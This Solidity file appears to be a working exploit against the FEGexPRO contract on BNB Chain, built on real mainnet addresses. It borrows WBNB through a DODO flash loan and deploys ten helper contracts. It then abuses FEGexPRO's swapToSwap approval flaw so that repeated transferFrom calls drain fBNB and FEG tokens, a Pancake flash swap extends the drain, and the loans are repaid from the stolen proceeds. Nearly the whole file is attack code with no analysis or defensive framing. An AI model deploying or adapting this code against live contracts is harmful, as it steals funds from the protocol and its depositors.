// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;


import "./IERC20.sol";
import "./console.sol";
import "./IUniswapV2pair.sol";

interface IDDPA_flashloan{
    function flashLoan(
        uint256 baseAmount,
        uint256 quoteAmount,
        address assetTo,
        bytes calldata data
    ) external;

    function getVaultReserve() external view returns (uint256 baseReserve, uint256 quoteReserve);
}

interface IfBNB{
    function deposit() external payable;
    function balanceOf(address account) external view  returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function withdraw(uint amt) external;
}

interface IFEGexPRO{

    function depositInternal(address asset, uint256 amt)  external;
    function userBalanceInternal(address _addr) external view returns(uint256, uint256);
    
    // function sync() external;
    function swapToSwap(address path,address asset,address to,uint256 amt) external;
    function withdrawInternal(address asset, uint256 amt) external;
    function transfer(address dst, uint256 amt) external returns(bool);
    function transferFrom(address src, address dst, uint256 amt) external returns(bool);
}

interface IWBNB{
    function withdraw(uint wad) external;
    function deposit() external payable;
}

contract flash_loan{
    address public constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address public constant DPPAdvanced = 0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4;               //flashloan wbnb and busd
    address public constant DODO_flash = 0xD534fAE679f7F02364D177E9D44F1D15963c0Dd7;                // quoteAmount WBNB

    address public constant BSW_LP = 0x8840C6252e2e86e545deFb6da98B2a0E26d8C1BA;                    //USDT - WBNB
    address public constant pancake_router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    address public constant fBNB = 0x87b1AccE6a1958E522233A737313C086551a5c76;
    address public constant FEGexPRO = 0x818E2013dD7D9bf4547AaabF6B617c1262578bc7;
    address public constant WBNB_FEGexPRO = 0x2Aa763656A92ce1e6E560c3EA76b4C5fca7C6C14;
    address public constant FEGtoken= 0xacFC95585D80Ab62f67A14C566C1b7a49Fe91167;
    address public constant WBNB_FEGtoken = 0x93D708BFea03c689F110dBe2E578D5568708F942;

    deploy_new_contract[] public acc;

    address admin;
    uint256 Borrow_money;


    constructor(){
        admin = msg.sender;
    }

    function killme() public {
        IERC20(WBNB).transfer(admin, IERC20(WBNB).balanceOf(address(this)));
    }

    function set_approve_token() public {
        IERC20(fBNB).approve(address(this), type(uint).max);
        IERC20(FEGexPRO).approve(address(this), type(uint).max);
        IERC20(FEGtoken).approve(address(this), type(uint).max);
        IERC20(WBNB_FEGexPRO).approve(address(this), type(uint).max);
    }

    function flashloan_from_DDAP() public {
        (uint256 v0, uint256 v1) = IDDPA_flashloan(DODO_flash).getVaultReserve();
        console.log("ddap flash loan start...baseAmount , quoteAmount : ", v0, v1);

        bytes memory _data = "ddap flash loan start...";
        uint256 baseAmount = 0;
        uint256 quoteAmount = v1;
        Borrow_money = v1;
        IDDPA_flashloan(DODO_flash).flashLoan(baseAmount, quoteAmount, address(this), _data);           //flashloan to borrow WBNB, then goes DVMFlashLoanCall()
        console.log("10xxxxx I have returned all the falshloan......");

        // console.log("now I have WBNB: ", IERC20(WBNB).balanceOf(address(this)));
        uint got_FEGtoken = IERC20(FEGtoken).balanceOf(address(this));
        console.log("at last I get FEGtoken: ", got_FEGtoken);

        (uint256 r0, uint256 r1, ) = UniswapV2Pair(WBNB_FEGtoken).getReserves();
        console.log("WBNB_FEGtoken pair reserve0 and reserve1...", r0, r1);

        uint pair_FEGtoken = IERC20(FEGtoken).balanceOf(WBNB_FEGtoken);
        console.log("WBNB_FEGtoken pair has FEGtoken: ", pair_FEGtoken);

        uint amount1Out = 61873581512272431479;
        bytes memory data = "";
        UniswapV2Pair(WBNB_FEGtoken).swap(0, amount1Out, address(this), data);          //61873581512272431479

        
        uint WBNB_balance = IERC20(WBNB).balanceOf(address(this));
        console.log("11xxxxxx I get WBNB!!!!!!!", WBNB_balance);
        IWBNB(WBNB).withdraw(WBNB_balance);

    }

    function DVMFlashLoanCall(address sender,uint256 baseAmount,uint256 quoteAmount,bytes calldata data) external {
        uint wbnb_balance = IERC20(WBNB).balanceOf(address(this));
        console.log("1xxxxx now I have WBNB: ", wbnb_balance);
        // console.log("flashloan logical ways...");
        IWBNB(WBNB).withdraw(wbnb_balance);

        uint FEGexPRO_balance_fbnb = IfBNB(fBNB).balanceOf(FEGexPRO);
        console.log("FEGexPRO_balance_fbnb is :", FEGexPRO_balance_fbnb);

        IfBNB(fBNB).deposit{value: 116813809359158325730}();
        console.log("2xxxxx after fbnb deposit FEGexPRO_balance_fbnb", IfBNB(fBNB).balanceOf(FEGexPRO));

        //create 10 accounts
        for(int i = 0; i < 10; i++){
            deploy_new_contract account = new deploy_new_contract();
            console.log("new account address...",address(account));
            acc.push(account);
        }
        console.log("3xxxxx 10 accounts have been created...");

        uint balance0 = IfBNB(fBNB).balanceOf(address(this));
        console.log("my fbnb balance is: ", balance0);

        IfBNB(fBNB).approve(FEGexPRO, balance0);              //115650737205006083495

        IFEGexPRO(FEGexPRO).depositInternal(fBNB, 115650737205006082495);        // IfBNB(fBNB).balanceOf(address(this)) - 1000
        (uint256 return0, uint256 return1) = IFEGexPRO(FEGexPRO).userBalanceInternal(address(this));
        console.log("4xxxxx FEGexPRO userBalanceInternal return0  , return1 : ", return0, return1);

        // IFEGexPRO(FEGexPRO).swapToSwap(address(this), fBNB, address(this), return1);           //has approve bugs,
        (bool success, bytes memory return_msg) = FEGexPRO.call(abi.encodeWithSignature("swapToSwap(address path,address asset,address to,uint256 amt)", address(this), fBNB, address(this), return1));          /////////////////////////////
        console.log("return message is: ", success);
        console.log("---------------------------------------------------------------");
        // IFEGexPRO(FEGexPRO).depositInternal(fBNB, 1);

        for(uint i = 0; i < 10; i++){
            IFEGexPRO(FEGexPRO).depositInternal(fBNB, 1);
            FEGexPRO.call(abi.encodeWithSignature("swapToSwap(address path,address asset,address to,uint256 amt)", address(acc[i]), fBNB, address(this), return1));
            // IFEGexPRO(FEGexPRO).swapToSwap(address(acc[i]), fBNB, address(this), return1);
        }
        console.log("5xxxxx after 10 times deposit and swap fBNB......");


        IfBNB(fBNB).transferFrom(FEGexPRO, address(this), return1);
        // console.log("I have fBNB balance: ", IfBNB(fBNB).balanceOf(address(this)));
        console.log("FEGexPRO fBNB balance: ", IfBNB(fBNB).balanceOf(FEGexPRO));

        for(uint i = 0; i < 10; i++){
            deploy_new_contract(payable(address(acc[i]))).name_2097a739_first(return1);
        }
        console.log("6xxxxx after 10 times fBNB transferfrom......");

        uint FEGtoken_balance = IERC20(FEGtoken).balanceOf(FEGexPRO);               //277330342870186251832396
        console.log("FEGtoken_balance...", FEGtoken_balance);

        (uint256 reserve0, uint256 reserve1, ) = UniswapV2Pair(WBNB_FEGexPRO).getReserves();
        console.log("WBNB_FEGexPRO r0 and r1: ", reserve0, reserve1);
        uint256 amount0Out = 31854779471720415521584;
        uint256 amount1Out = 423000000008079789366;
        bytes memory data = "FEG swap...";
        UniswapV2Pair(WBNB_FEGexPRO).swap(amount0Out, amount1Out, address(this), data);     // pancake flash swap
        console.log("10xxxxx I have returned pancake flash swap...");        

        IfBNB(fBNB).withdraw(117994796971779416403);              //117994796971779416403
        IWBNB(WBNB).deposit{value: 915.8422894471248 * 10 ** 18}();                        //915.8422894471248


        console.log("DODO flashloan return...");
        IERC20(WBNB).transfer(DODO_flash, Borrow_money);     //return flashloan   
    }

    function pancakeCall(address _account, uint256 _amount0, uint256 _amount1, bytes memory _data) public{
        console.log("7xxxxx pancake flash swap...");

        uint256 feg_balance = IERC20(FEGtoken).balanceOf(FEGexPRO);
        console.log("FEGexPRO FEGtoken_balance...", feg_balance);

        uint256 my_feg_balance = IERC20(FEGtoken).balanceOf(address(this));
        console.log("my FEGtoken balance: ", my_feg_balance);               //31217882849517214500538

        IERC20(FEGtoken).approve(FEGexPRO, my_feg_balance);

        IFEGexPRO(FEGexPRO).depositInternal(FEGtoken, 30814678938542177811298);              //30814678938542177811298
        (uint256 return0, uint256 return1) = IFEGexPRO(FEGexPRO).userBalanceInternal(address(this));
        console.log("8xxxxxx FEGexPRO userBalanceInternal return0  , return1 : ", return0, return1);        //30202049261636789716172,  10
        IFEGexPRO(FEGexPRO).swapToSwap(address(this), FEGtoken, address(this), return0);

        for(uint i = 0; i < 10; i++){
            IFEGexPRO(FEGexPRO).depositInternal(fBNB, 1);
            IFEGexPRO(FEGexPRO).swapToSwap(address(acc[i]), fBNB, address(this), return1);
        }

        IERC20(FEGtoken).transferFrom(FEGexPRO, WBNB_FEGexPRO, return1);                //30202049261636789716172
        // uint256 FEGexPRO_feg_balance = IERC20(FEGtoken).balanceOf(FEGexPRO);
        // console.log("FEGexPRO_feg_balance balance: ", FEGexPRO_feg_balance);

        for(uint i = 0; i < 10; i++){
            deploy_new_contract(payable(address(acc[i]))).name_2097a739_second(return1);
        }
        console.log("9xxxxx after 10 times FEGtoken transferfrom......");

        uint FEG_balance_remain = IERC20(FEGtoken).balanceOf(address(this));
        console.log("my FEG_balance_remain...", FEG_balance_remain);

        //return pancake flash swap.
        IERC20(FEGtoken).transfer(WBNB_FEGexPRO, FEG_balance_remain);
    }

/*     function flashloan_from_swap() public {
        (uint256 r0, uint256 r1, ) = UniswapV2Pair(BSW_LP).getReserves();
        console.log("the pool has reserve0 and reserve1", r0, r1);

        uint256 amount0Out = 0;
        uint256 amount1Out = 57790516950469263902170;
        bytes memory _data = bytes("flash swap...");
        UniswapV2Pair(BSW_LP).swap(amount0Out, amount1Out, address(this), _data);
    } 


    function pancakeCall(address _account, uint256 _amount0, uint256 _amount1, bytes memory _data) public{
        uint256 wbnb_borrowed = IERC20(WBNB).balanceOf(address(this));
        console.log("1xxxxx I have borrow money from swap...", wbnb_borrowed);

        // IWBNB(WBNB).withdraw(wbnb_borrowed);

        IfBNB(fBNB).deposit{value: 30 * 10 ** 18}();
        uint256 fBNB_balance0 = IERC20(fBNB).balanceOf(address(this));
        console.log("fBNB_balance0...", fBNB_balance0);

        IERC20(fBNB).transfer(FEGtoken, fBNB_balance0);


        uint amountOutMin = 0;
        address[] memory path = new address[](2);
        path[0] = WBNB;
        path[1] = FEGtoken;
        UniswapV2Pair(pancake_router).swapExactETHForTokensSupportingFeeOnTransferTokens{value: 105 * 10 ** 18}(amountOutMin, path, FEGexPRO, 9999999999);
        console.log("2xxxxx swapExactETHForTokensSupportingFeeOnTransferTokens.. ");

        IFEGexPRO(FEGexPRO).sync();

    }
*/
    receive() external payable{}

    fallback() external{}

}

contract deploy_new_contract{
    address public admin;
    address public constant fBNB = 0x87b1AccE6a1958E522233A737313C086551a5c76;
    address public constant FEGexPRO = 0x818E2013dD7D9bf4547AaabF6B617c1262578bc7;
    address public constant FEGtoken= 0xacFC95585D80Ab62f67A14C566C1b7a49Fe91167;

    constructor(){
        admin = msg.sender;
    }

    function name_2097a739_first(uint256 amount) public{
        console.log("FEGexPRO has fBNB balance: ", IfBNB(fBNB).balanceOf(FEGexPRO));
        IfBNB(fBNB).transferFrom(FEGexPRO, admin, amount);
    }

    function name_2097a739_second(uint256 amount) public{
        console.log("FEGexPRO has FEGtoken balance: ", IfBNB(FEGtoken).balanceOf(FEGexPRO));
        IfBNB(FEGtoken).transferFrom(FEGexPRO, admin, amount);
    }

    receive() external payable{}
    fallback() external{}
}